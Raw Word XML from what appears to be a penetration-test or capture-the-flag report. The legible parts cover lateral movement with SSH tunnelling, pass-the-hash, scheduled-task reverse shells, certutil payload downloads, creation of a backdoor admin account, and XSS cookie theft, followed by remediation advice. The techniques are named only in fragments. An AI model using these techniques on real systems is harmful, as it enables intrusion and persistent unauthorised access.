          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>5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.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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> L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ater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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>a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 xml:space="preserve">l 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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>M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oveme</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-4"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>n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 xml:space="preserve">t to </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>E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xec</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>u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t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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>i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ve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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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Work</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>s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ta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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>t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i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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>o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n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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a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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>n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 xml:space="preserve">d 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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>P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er</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-3"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>s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is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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>t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e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-4"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>n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 xml:space="preserve">t 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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>A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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>cc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e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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>s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s</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="7" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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Fl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g 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ent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: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FL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G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2"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>{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pe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_pa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y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s_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pacing w:val="3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}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="15"/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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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isk Rat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ng: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Cr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ic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l |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CV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e: 9.0</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="2" w:line="100" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="10"/>
          <w:szCs w:val="10"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>Summa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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>r</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>y:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="2160"/>
        </w:tabs>
        <w:spacing w:before="35" w:line="276" w:lineRule="auto"/>
        <w:ind w:left="2160" w:right="1674" w:hanging="36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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t>•</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:tab/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Us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ing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SS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H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ng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d pa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sing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sh,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ss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nn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-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PC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,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y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ss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ng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egmen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ion c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nt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ol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.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="13"/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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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ing Li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v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ing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-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-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-La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(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oL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),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mpl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me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pe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en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e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-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PC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.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="54"/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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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ersisten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 w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li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sh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ed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v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ed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sk</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="3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un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ng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v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erse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ells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color w:val="404040"/>
          <w:spacing w:val="3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-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C.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="19" w:line="220" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-1"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>oo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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ls</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>/C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24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>o</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>mma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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>n</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ds</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>U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24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>s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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>d:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="35"/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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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k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xec 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 t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st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pa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-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e-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g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he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SS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H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un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el</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="37"/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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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Us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Im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k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et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o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bt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in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system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le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v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el p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mpt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on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-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PC</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="35"/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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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ower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hell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cr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pt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o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pen</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-4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v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erse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ell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ck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o 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tt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cker</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="35"/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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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cer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util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o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ownl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4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ow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hell scri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m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K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li</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="37"/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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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sc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k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 c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sk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 run t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e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ower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Sh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ell scri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er log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</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="35"/>
        <w:ind w:left="1800"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:sectPr w:rsidR="00CF78E9">
          <w:pgSz w:w="12240" w:h="15840"/>
          <w:pgMar w:top="700" w:right="0" w:bottom="280" w:left="0" w:header="0" w:footer="696" w:gutter="0"/>
          <w:cols w:space="720"/>
        </w:sectPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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net u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, net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gr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up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create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min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cc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unt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ck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r</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="2" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="34"/>
        <w:ind w:left="1440"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>R</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e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24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>c</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>omm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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>nd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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t xml:space="preserve">d </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="2"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>R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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>m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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>d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24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>a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4"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>ti</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
        </w:rPr>
        <w:t>on:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="6" w:line="120" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="13"/>
          <w:szCs w:val="13"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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or 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a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ert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us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l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SS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H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un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el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nd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TT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/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HT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ct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iv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y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.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="15"/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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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or s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ul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sk c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io</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="3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.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="15"/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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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e 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olutio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et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ct out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nd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shel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nd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ning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color w:val="404040"/>
          <w:spacing w:val="4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v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ior.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="15"/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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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Us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er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nti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y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v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ior </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="-4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yt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ics</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Book" w:eastAsia="Franklin Gothic Book" w:hAnsi="Franklin Gothic Book" w:cs="Franklin Gothic Book"/>
          <w:color w:val="404040"/>
          <w:spacing w:val="3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nitor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un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l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se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pacing w:val="3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Wi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ows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ie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.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="2" w:line="200" w:lineRule="exact"/>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:ind w:left="1080"/>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>6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. O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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>b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ta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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>i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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>n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i</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>n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g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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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a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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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S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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>e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ss</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>i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on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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 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C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28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>o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 xml:space="preserve">okie </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Franklin Gothic Medium" w:eastAsia="Franklin Gothic Medium" w:hAnsi="Franklin Gothic Medium" w:cs="Franklin Gothic Medium"/>
          <w:color w:val="A4634E"/>
          <w:spacing w:val="-2"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>v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 xml:space="preserve">ia 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8"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>X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SS</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
      <w:pPr>
        <w:spacing w:before="4" w:line="140" w:lineRule="exact"/>
        <w:rPr>
          <w:sz w:val="14"/>
          <w:szCs w:val="14"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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Fl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g 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ent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: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FL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G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{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7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12052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9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2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9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}</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00A76861">
      <w:pPr>
        <w:spacing w:before="18"/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color w:val="404040"/>
          <w:w w:val="131"/>
          <w:sz w:val="22"/>
          <w:szCs w:val="22"/>
        </w:rPr>
        <w:t xml:space="preserve">•  </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="404040"/>
          <w:spacing w:val="42"/>
          <w:w w:val="13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isk Rat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ng: Hi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g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| C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VS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e: 8.7</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00CF78E9" w:rsidRDefault="00CF78E9">
